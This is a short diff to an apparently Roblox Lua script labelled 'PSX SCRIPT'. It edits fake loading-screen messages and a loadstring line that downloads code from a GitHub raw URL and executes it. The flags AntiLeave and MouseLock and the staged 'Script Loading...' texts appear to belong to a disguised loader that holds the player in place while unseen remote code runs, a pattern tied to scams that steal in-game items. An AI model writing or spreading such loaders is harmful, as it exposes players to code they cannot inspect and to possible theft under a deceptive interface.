@@ -8,14 +8,14 @@ _G.AntiLeave = true
 
 _G.MouseLock = true 
 
-_G.ScriptName = "PSX SCRIPT"
+_G.ScriptName = "Thanks For Choosing Our Script!"
 
-_G.FirstText = "Preparing Script..."
+_G.FirstText = "Script Preparing"
 
-_G.SecondText = "Loading Script..."
+_G.SecondText = "Script Loading..."
 
-_G.ThirdText = "Finishing Things Up..."
+_G.ThirdText = "Almost Done..."
 
 _G.WaitingTime = 100
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PSX12345/PSX-SCRIPT/main/PSXSCRIPT", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PSX12345/PSX-SCRIPT/main/PSX%20SCRIPT", true))()
